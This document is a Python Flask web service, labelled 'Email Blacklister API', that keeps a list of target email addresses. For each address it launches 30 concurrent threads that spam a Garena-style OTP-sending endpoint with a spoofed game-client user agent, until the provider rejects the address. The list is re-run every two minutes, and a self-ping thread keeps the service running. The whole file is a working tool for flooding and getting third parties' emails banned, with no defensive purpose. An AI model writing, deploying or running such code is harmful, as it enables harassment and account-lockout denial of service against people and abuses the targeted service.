import os
import time
import threading
import requests
import urllib3
import json
from datetime import datetime
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIG ====================
NUM_WORKERS = int(os.environ.get("NUM_WORKERS", "30"))
AUTO_INTERVAL_MINUTES = int(os.environ.get("AUTO_INTERVAL_MINUTES", "2"))
AUTO_INTERVAL_SECONDS = AUTO_INTERVAL_MINUTES * 60
AUTO_EMAILS_FILE = "auto_emails.json"
RESULTS_FILE = "blacklist_results.json"
MAX_RESULTS_HISTORY = 500
SELF_PING_INTERVAL = 60

app = Flask(__name__)

# ==================== GLOBAL STATE ====================
auto_emails_list = []
results_history = []
total_attempts_ever = 0

any_success = False
any_success_lock = threading.Lock()
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0

last_run_time = 0.0
scheduler_lock = threading.Lock()
blacklist_running = False

EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")


# ==================== HELPERS ====================
def utc_now_str():
    return datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')


def log(msg):
    try:
        print("[" + utc_now_str() + "] " + str(msg), flush=True)
    except Exception:
        pass


# ==================== FILE HELPERS ====================
def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_EMAILS_FILE):
            with open(AUTO_EMAILS_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    auto_emails_list = [str(e).strip() for e in data if e]
                else:
                    auto_emails_list = []
        else:
            auto_emails_list = []
            save_auto_emails()
        log("[+] Loaded " + str(len(auto_emails_list)) + " emails: " + str(auto_emails_list))
    except Exception as e:
        log("[!] Load error: " + str(e))
        auto_emails_list = []


def save_auto_emails():
    try:
        with open(AUTO_EMAILS_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
    except Exception as e:
        log("[!] Save error: " + str(e))


def save_results():
    global results_history
    try:
        if len(results_history) > MAX_RESULTS_HISTORY:
            results_history = results_history[-MAX_RESULTS_HISTORY:]
        with open(RESULTS_FILE, 'w') as f:
            json.dump(results_history, f, indent=4)
    except Exception as e:
        log("[!] Save results error: " + str(e))


# ==================== WORKER ====================
def worker(email, gen):
    global any_success
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://swap-otp-sender.vercel.app/send"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {"app_id": "100067", "email": email, "locale": "en_HK"}
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15, verify=False)
            if resp.status_code == 200:
                with any_success_lock:
                    any_success = True
            else:
                with error_print_lock:
                    if not error_event.is_set():
                        error_event.set()
                        stop_event.set()
                return
        except Exception:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    stop_event.set()
            return


def blacklist_email(email):
    global any_success, error_event, stop_event, generation
    generation += 1
    any_success = False
    error_event.clear()
    stop_event.clear()

    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)

    stop_event.wait(timeout=20)
    for t in threads:
        t.join(timeout=2)

    if error_event.is_set():
        if not any_success:
            return False, "EMAIL ALREADY BLACKLISTED"
        else:
            return True, "EMAIL BLACKLISTED SUCCESSFULLY"
    return False, "UNKNOWN ERROR OCCURRED"


# ==================== AUTO BLACKLIST JOB ====================
def run_auto_blacklist():
    global total_attempts_ever

    if not auto_emails_list:
        log("[!] Auto list empty, skipping...")
        return

    log("=" * 50)
    log("AUTO BLACKLIST STARTED - " + str(len(auto_emails_list)) + " emails")
    log("=" * 50)

    summary = {"success": 0, "failed": 0, "skipped": 0, "total": len(auto_emails_list)}
    emails_copy = list(auto_emails_list)

    for email in emails_copy:
        log("[>] Processing: " + email)
        success, msg = blacklist_email(email)

        record = {
            "email": email,
            "success": success,
            "message": msg,
            "time": utc_now_str()
        }
        results_history.append(record)
        total_attempts_ever += 1
        save_results()

        if success:
            summary["success"] += 1
            log("[OK] SUCCESS: " + email)
        elif "ALREADY" in msg:
            summary["skipped"] += 1
            log("[SKIP] ALREADY BLACKLISTED: " + email)
        else:
            summary["failed"] += 1
            log("[FAIL] " + email)

        time.sleep(2)

    log("AUTO BLACKLIST COMPLETE: " + str(summary))
    log("[TOTAL EVER] " + str(total_attempts_ever))
    log("=" * 50)


# ==================== SCHEDULER (REQUEST-BASED) ====================
def check_and_run_if_needed():
    global last_run_time, blacklist_running

    if not auto_emails_list:
        with scheduler_lock:
            last_run_time = time.time()
        return False

    with scheduler_lock:
        now = time.time()
        if (now - last_run_time) < AUTO_INTERVAL_SECONDS:
            return False
        if blacklist_running:
            return False
        last_run_time = now
        blacklist_running = True

    t = threading.Thread(target=_run_blacklist_wrapper, daemon=True)
    t.start()
    return True


def _run_blacklist_wrapper():
    global blacklist_running
    try:
        run_auto_blacklist()
    except Exception as e:
        log("[!] Blacklist wrapper error: " + str(e))
    finally:
        with scheduler_lock:
            blacklist_running = False


# ==================== BEFORE REQUEST HOOK ====================
@app.before_request
def _before_request_trigger():
    if request.path in ('/run-now', '/health', '/blacklist', '/reset-results'):
        return
    try:
        check_and_run_if_needed()
    except Exception as e:
        log("[!] before_request error: " + str(e))


# ==================== SELF-PING (BACKUP) ====================
def self_ping_loop():
    time.sleep(15)
    while True:
        try:
            if EXTERNAL_URL:
                requests.get(EXTERNAL_URL + "/", timeout=10, verify=False)
        except Exception:
            pass
        time.sleep(SELF_PING_INTERVAL)


# ==================== API ENDPOINTS ====================
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "service": "Email Blacklister API",
        "interval_minutes": AUTO_INTERVAL_MINUTES,
        "total_emails": len(auto_emails_list),
        "total_results": len(results_history),
        "total_attempts_ever": total_attempts_ever,
        "emails": auto_emails_list,
        "seconds_since_last_run": round(time.time() - last_run_time, 1) if last_run_time > 0 else None,
        "blacklist_running_now": blacklist_running
    })


@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "time": utc_now_str()})


@app.route('/stats', methods=['GET'])
def stats():
    """Detailed stats"""
    success_count = sum(1 for r in results_history if r.get('success'))
    skipped_count = sum(1 for r in results_history if 'ALREADY' in r.get('message', ''))
    failed_count = len(results_history) - success_count - skipped_count
    return jsonify({
        "total_attempts_ever": total_attempts_ever,
        "total_in_list": len(results_history),
        "emails_count": len(auto_emails_list),
        "recent_success": success_count,
        "recent_skipped": skipped_count,
        "recent_failed": failed_count,
        "last_run_seconds_ago": round(time.time() - last_run_time, 1) if last_run_time > 0 else None,
        "blacklist_running": blacklist_running,
        "interval_minutes": AUTO_INTERVAL_MINUTES
    })


@app.route('/blacklist', methods=['POST'])
def api_blacklist():
    global total_attempts_ever
    data = request.get_json(silent=True) or {}
    email = str(data.get('email', '')).strip()
    if not email or '@' not in email or '.' not in email:
        return jsonify({"success": False, "error": "Invalid email"}), 400

    log("[API] Blacklisting now: " + email)
    success, msg = blacklist_email(email)

    record = {
        "email": email, "success": success, "message": msg,
        "time": utc_now_str(), "source": "api"
    }
    results_history.append(record)
    total_attempts_ever += 1
    save_results()

    return jsonify({
        "success": success, "email": email,
        "message": msg, "time": record["time"],
        "total_attempts_ever": total_attempts_ever
    })


@app.route('/add', methods=['POST'])
def api_add():
    data = request.get_json(silent=True) or {}
    emails = data.get('emails', [])
    if isinstance(emails, str):
        emails = [e.strip() for e in emails.split(',') if e.strip()]

    added, invalid, exists = [], [], []
    for email in emails:
        email = str(email).strip()
        if not email or '@' not in email or '.' not in email:
            invalid.append(email)
        elif email in auto_emails_list:
            exists.append(email)
        else:
            auto_emails_list.append(email)
            added.append(email)

    save_auto_emails()
    return jsonify({
        "success": True, "added": added, "already_exists": exists,
        "invalid": invalid, "total_in_list": len(auto_emails_list)
    })


@app.route('/remove', methods=['POST'])
def api_remove():
    data = request.get_json(silent=True) or {}
    emails = data.get('emails', [])
    if isinstance(emails, str):
        emails = [e.strip() for e in emails.split(',') if e.strip()]

    removed, not_found = [], []
    for email in emails:
        email = str(email).strip()
        if email in auto_emails_list:
            auto_emails_list.remove(email)
            removed.append(email)
        else:
            not_found.append(email)

    save_auto_emails()
    return jsonify({
        "success": True, "removed": removed, "not_found": not_found,
        "total_in_list": len(auto_emails_list)
    })


@app.route('/list', methods=['GET'])
def api_list():
    return jsonify({
        "total": len(auto_emails_list),
        "emails": auto_emails_list,
        "interval_minutes": AUTO_INTERVAL_MINUTES
    })


@app.route('/results', methods=['GET'])
def api_results():
    limit = request.args.get('limit', default=50, type=int)
    return jsonify({
        "total": len(results_history),
        "total_attempts_ever": total_attempts_ever,
        "results": results_history[-limit:] if limit > 0 else []
    })


@app.route('/run-now', methods=['POST'])
def api_run_now():
    global last_run_time, blacklist_running
    if not auto_emails_list:
        return jsonify({"success": False, "error": "Auto list is empty"}), 400

    with scheduler_lock:
        if blacklist_running:
            return jsonify({"success": False, "error": "Blacklist already running"}), 409
        last_run_time = time.time()
        blacklist_running = True

    t = threading.Thread(target=_run_blacklist_wrapper, daemon=True)
    t.start()

    return jsonify({
        "success": True,
        "message": "Auto blacklist triggered in background",
        "total_emails": len(auto_emails_list)
    })


@app.route('/clear', methods=['DELETE'])
def api_clear():
    global auto_emails_list
    count = len(auto_emails_list)
    auto_emails_list = []
    save_auto_emails()
    return jsonify({"success": True, "cleared": count, "message": "Auto list cleared"})


@app.route('/reset-results', methods=['DELETE', 'POST', 'GET'])
def reset_results():
    """Results history reset karo (counter 0 se start)"""
    global results_history, total_attempts_ever
    count = len(results_history)
    results_history = []
    total_attempts_ever = 0
    save_results()
    log("[+] Results reset: " + str(count) + " cleared")
    return jsonify({
        "success": True,
        "cleared": count,
        "message": "Results and counter reset to 0"
    })


@app.route('/reset-counter', methods=['DELETE', 'POST', 'GET'])
def reset_counter():
    """Sirf counter reset karo (results waise hi rahenge)"""
    global total_attempts_ever
    old = total_attempts_ever
    total_attempts_ever = 0
    log("[+] Counter reset: " + str(old) + " -> 0")
    return jsonify({
        "success": True,
        "old_value": old,
        "new_value": 0,
        "message": "Counter reset to 0"
    })


# ==================== AUTO START ON IMPORT ====================
def _start_background_jobs():
    try:
        load_auto_emails()
        log("[+] Request-based scheduler ready (interval: " + str(AUTO_INTERVAL_MINUTES) + " min)")
        if EXTERNAL_URL:
            log("[+] Self-ping target: " + EXTERNAL_URL)
        threading.Thread(target=self_ping_loop, daemon=True).start()
        log("[+] Self-ping thread started")
    except Exception as e:
        log("[!] Failed to start background jobs: " + str(e))


_start_background_jobs()


# ==================== MAIN ====================
if __name__ == '__main__':
    log("=" * 50)
    log("EMAIL BLACKLISTER API")
    log("=" * 50)
    log("Workers per email: " + str(NUM_WORKERS))
    log("Auto interval: " + str(AUTO_INTERVAL_MINUTES) + " minute")
    log("=" * 50)
    port = int(os.environ.get("PORT", 5000))
    log("Server starting on http://0.0.0.0:" + str(port))
    log("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)